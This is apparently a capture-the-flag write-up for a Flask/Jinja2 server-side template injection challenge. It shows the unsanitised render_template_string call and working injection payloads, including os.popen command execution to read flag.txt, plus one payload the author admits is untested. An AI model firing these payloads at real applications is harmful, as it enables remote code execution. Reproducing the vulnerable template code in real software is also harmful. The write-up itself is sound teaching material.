# Why Hello There - SSTI Vulnerability
**Description**: I have created a simple site to host my most favorite stuff. There is an issue with one of the parameters and I'm not sure what to do! Can you get the flag using this parameter?
- *Hints*: Always be sure to sanitize user input!... Even ones that are not always visually obvious at first glance.

## Introduction

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious templates into a web application, potentially leading to Remote Code Execution (RCE) or information disclosure. SSTI vulnerabilities arise when user input is dynamically inserted into templates and then rendered by the server-side template engine without proper sanitization or validation.

In this challenge, we explore an SSTI vulnerability within a Flask web application. Flask is a popular Python web framework that includes support for Jinja2 templating. Jinja2 is powerful but can be susceptible to SSTI if not properly secured.

## Challenge Overview

The provided source code defines a simple Flask application serving a blog-like website. The application uses the `render_template_string` function from Flask, which dynamically renders templates based on user input. This function is used to customize a greeting message with the visitor's name, which is retrieved from URL parameters.

### Vulnerability Analysis

The critical line in the application is where `render_template_string` is used:

```python
name = request.args.get('name', 'CTF Player')
return render_template_string(f'''
...
<p>Hello {name}! This is a place where I share my thoughts and experiences.</p>
...
''')
```

The `name` parameter from the URL is inserted directly into the template. Since there is no sanitization of the `name` parameter, an attacker can exploit this by injecting a template syntax that can be executed by the server.

### Exploiting SSTI in Flask

To exploit this vulnerability, an attacker can craft a payload that the Jinja2 template engine will execute. Since the challenge specifies that this is a Windows machine, the goal is to read the contents of `flag.txt`.

A common approach to achieve this is to leverage Jinja2's ability to access Python's built-in attributes and functions through the template. An attacker can use this capability to execute arbitrary Python code.

#### Payload to Read `flag.txt`

The payload to exploit this SSTI vulnerability and read the contents of `flag.txt` on a Windows machine might look something like this:

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('flag.txt').read() }}
```

This payload works by accessing Python's built-in attributes to open and read a file. The steps are as follows:

1. `''.__class__.__mro__[2]` accesses the `object` base class.
2. `__subclasses__()` lists all subclasses of `object`, where one of them is typically the `file` class or a class that can be used to open files.
3. The index `[40]` (which might need adjustment based on the Python environment) is assumed to be the class that can open files.
4. `('flag.txt').read()` attempts to open `flag.txt` and read its contents.

### Conclusion

This challenge demonstrates the critical importance of sanitizing and validating all user inputs, especially when those inputs are used within template engines like Jinja2 in Flask applications. SSTI vulnerabilities can lead to significant security risks, including unauthorized access to sensitive data and system command execution. Always ensure user inputs are handled securely to prevent such vulnerabilities.
note: The code above is not tested, but the payload is something along those lines.

I.e.,
```
https://MACHINE_IP:10000/?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```
OR

```
http://MACHINE_IP:10000/?name={{config.__class__.__init__.__globals__[%27__builtins__%27][%27__import__%27](%27os%27).popen(%27type%20flag.txt%27).read()}}
```
![alt text](image.png)